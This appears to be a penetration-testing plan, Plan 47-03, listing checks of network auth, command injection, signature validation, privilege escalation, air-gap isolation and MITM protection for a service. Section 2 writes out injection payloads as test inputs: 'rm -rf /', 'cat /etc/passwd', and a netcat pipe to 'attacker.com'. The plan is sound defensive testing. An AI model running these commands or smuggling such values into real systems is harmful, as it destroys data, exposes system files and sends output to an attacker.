---
phase: 47
plan: 47-03
title: "Network Security & Service Architecture"
depends_on: []
---

# Plan 47-03: Network Security & Service Architecture

## Goal
Verify network security and service architecture resilience against attacks. Test control plane auth (gRPC mTLS, MQTT TLS, WebSocket WSS), AEDS command injection, rogue client registration, manifest signature forgery, service daemon privilege escalation, unauthorized plugin loading, client profile port restrictions, air-gap mode network isolation, data transit MITM, API auth, and SignalR WebSocket auth bypass.

## Approach
1. **Control Plane Authentication Verification**:
   - **gRPC mTLS**:
     - Attempt to connect without client certificate → verify rejected
     - Attempt to connect with invalid certificate → verify rejected
     - Attempt to connect with expired certificate → verify rejected
     - Attempt to connect with revoked certificate → verify rejected
     - Verify mutual TLS (server validates client cert, client validates server cert)
   - **MQTT TLS**:
     - Attempt to connect without TLS (port 1883) → verify rejected
     - Attempt to connect with TLS but no client cert → verify rejected
     - Attempt to connect with invalid certificate → verify rejected
     - Verify TLS 1.2+ (reject TLS 1.0, TLS 1.1)
   - **WebSocket WSS**:
     - Attempt to connect without TLS (ws://) → verify rejected
     - Attempt to connect with TLS but no auth token → verify rejected
     - Attempt to connect with invalid auth token → verify rejected
     - Verify JWT validation (signature, expiration, issuer)

2. **AEDS Command Injection Verification**:
   - Attempt command injection via manifest actions:
     - `{"action": "execute; rm -rf /", "params": {}}`
     - `{"action": "execute && cat /etc/passwd", "params": {}}`
     - `{"action": "execute | nc attacker.com 1234", "params": {}}`
   - Verify input sanitization (reject semicolons, ampersands, pipes, backticks)
   - Verify command whitelist (only allowed actions executed)
   - Verify no shell execution (execute directly, not via shell)

3. **Rogue Client Registration Verification**:
   - Attempt to register client without authentication:
     - Send registration request without token → verify rejected
     - Send registration request with invalid token → verify rejected
   - Attempt to register client with stolen credentials:
     - Intercept valid registration request, replay → verify rejected (nonce/timestamp validation)
   - Verify registration requires admin approval (new client added to pending list)
   - Verify client revocation (admin can revoke client, client cannot reconnect)

4. **Manifest Signature Forgery Verification**:
   - Attempt to load manifest without signature → verify rejected
   - Attempt to load manifest with invalid signature → verify rejected
   - Attempt to modify manifest and re-sign with different key → verify rejected
   - Verify signature validation:
     - Public key trusted (loaded from trust store)
     - Signature algorithm strong (RSA-PSS 4096, ECDSA P-384, EdDSA)
     - Manifest hash matches signed hash

5. **Service Daemon Privilege Escalation Verification**:
   - Attempt to switch profile at runtime (Server → Client, Client → Server) → verify rejected
   - Attempt to execute admin command as regular user → verify rejected
   - Attempt to load plugin without admin privileges → verify rejected
   - Verify service daemon runs with least privilege:
     - Server profile: runs as SYSTEM (Windows) or root (Linux) — required for port binding
     - Client profile: runs as normal user (no admin required)
   - Verify privilege separation (worker processes run as non-root)

6. **Unauthorized Plugin Loading Verification**:
   - Attempt to load unsigned plugin → verify rejected
   - Attempt to load plugin signed by untrusted key → verify rejected
   - Attempt to load plugin with missing dependencies → verify rejected
   - Attempt to load plugin with malicious code (execute shell, access filesystem) → verify sandboxed
   - Verify plugin signature validation (same as manifest)
   - Verify plugin isolation (plugin cannot access kernel internals, other plugin data)

7. **Client Profile Port Restriction Verification**:
   - Start service in Client profile
   - Verify no server ports opened:
     - Scan ports 1-65535 → verify only outbound connections
     - Attempt to connect to client on server port → verify connection refused
   - Verify client connects to remote server:
     - Client initiates connection to server (gRPC, MQTT, WebSocket)
     - Server accepts connection
     - Client cannot accept incoming connections

8. **Air-Gap Mode Network Isolation Verification**:
   - Enable air-gap mode
   - TCP/UDP scan for outbound connections:
     - Use tcpdump/Wireshark to capture all network traffic
     - Verify zero outbound connections (no DNS, HTTP, HTTPS, NTP, OCSP, CRL)
   - Verify USB-only data transfer:
     - Copy data to USB drive
     - Verify data written to USB
     - Verify no network activity during USB transfer
   - Verify time sync disabled (use local clock or manual setting)

9. **Data Transit MITM Verification**:
   - Attempt to intercept data in transit:
     - Use mitmproxy to intercept HTTPS traffic → verify TLS prevents MITM
     - Use Wireshark to capture network traffic → verify all data encrypted (TLS 1.2+, AES-256-GCM)
   - Verify certificate pinning (client rejects server cert not in pin list)
   - Verify TLS cipher suite strength (reject weak ciphers: RC4, 3DES, MD5)

10. **API Authentication Verification**:
    - Attempt to call API without authentication → verify HTTP 401 Unauthorized
    - Attempt to call API with invalid token → verify HTTP 401
    - Attempt to call API with expired token → verify HTTP 401
    - Verify token validation (JWT: signature, expiration, issuer, audience)
    - Verify token refresh (client can refresh token before expiration)
    - Verify token revocation (admin can revoke token, client cannot use revoked token)

11. **SignalR WebSocket Auth Bypass Verification**:
    - Attempt to connect to SignalR hub without authentication → verify rejected
    - Attempt to connect with invalid token → verify rejected
    - Attempt to invoke hub method without authorization → verify rejected
    - Verify SignalR authentication (JWT token in query string or header)
    - Verify SignalR authorization (user can only invoke allowed methods)

## Scope
**In Scope:**
- Network security: gRPC mTLS, MQTT TLS, WebSocket WSS
- AEDS command injection, rogue client registration, manifest signature forgery
- Service daemon privilege escalation, unauthorized plugin loading
- Client profile port restrictions
- Air-gap mode network isolation (zero outbound connections)
- Data transit MITM, API auth, SignalR auth

**Out of Scope:**
- OWASP Top 10 (Plan 47-01)
- Cryptographic security (Plan 47-02)
- Data security (Plan 47-04)
- Infrastructure security (Plan 47-05)

## Success Criteria
- [ ] gRPC mTLS verified (rejects no cert, invalid cert, expired cert, revoked cert)
- [ ] MQTT TLS verified (rejects no TLS, no cert, invalid cert; enforces TLS 1.2+)
- [ ] WebSocket WSS verified (rejects no TLS, no token, invalid token; validates JWT)
- [ ] AEDS command injection blocked (sanitizes input, whitelists actions, no shell execution)
- [ ] Rogue client registration blocked (requires auth, rejects replay, requires admin approval)
- [ ] Manifest signature forgery blocked (validates signature, trusted key, strong algorithm)
- [ ] Service daemon privilege escalation blocked (cannot switch profile, admin commands require admin)
- [ ] Unauthorized plugin loading blocked (validates signature, trusted key, sandboxed)
- [ ] Client profile port restrictions verified (no server ports, only outbound connections)
- [ ] Air-gap mode verified (zero outbound connections: no DNS, HTTP, NTP, OCSP, CRL)
- [ ] Data transit MITM blocked (TLS 1.2+, AES-256-GCM, certificate pinning, strong ciphers)
- [ ] API auth verified (rejects no token, invalid token, expired token; validates JWT)
- [ ] SignalR auth verified (rejects no token, invalid token; authorizes methods)
- [ ] All findings documented with severity (CRITICAL, HIGH, MEDIUM, LOW)

## Output
- `47-03-network-security-report.md`: Test results for network security and service architecture
  - Control plane auth verification results (gRPC, MQTT, WebSocket)
  - AEDS command injection verification results
  - Rogue client registration verification results
  - Manifest signature forgery verification results
  - Service daemon privilege escalation verification results
  - Unauthorized plugin loading verification results
  - Client profile port restriction verification results
  - Air-gap mode network isolation verification results (tcpdump/Wireshark capture)
  - Data transit MITM verification results
  - API auth verification results
  - SignalR auth verification results
  - All vulnerabilities found with severity and remediation
- Updated `.planning/phases/47-penetration-testing/STATUS.md` with pass/fail results
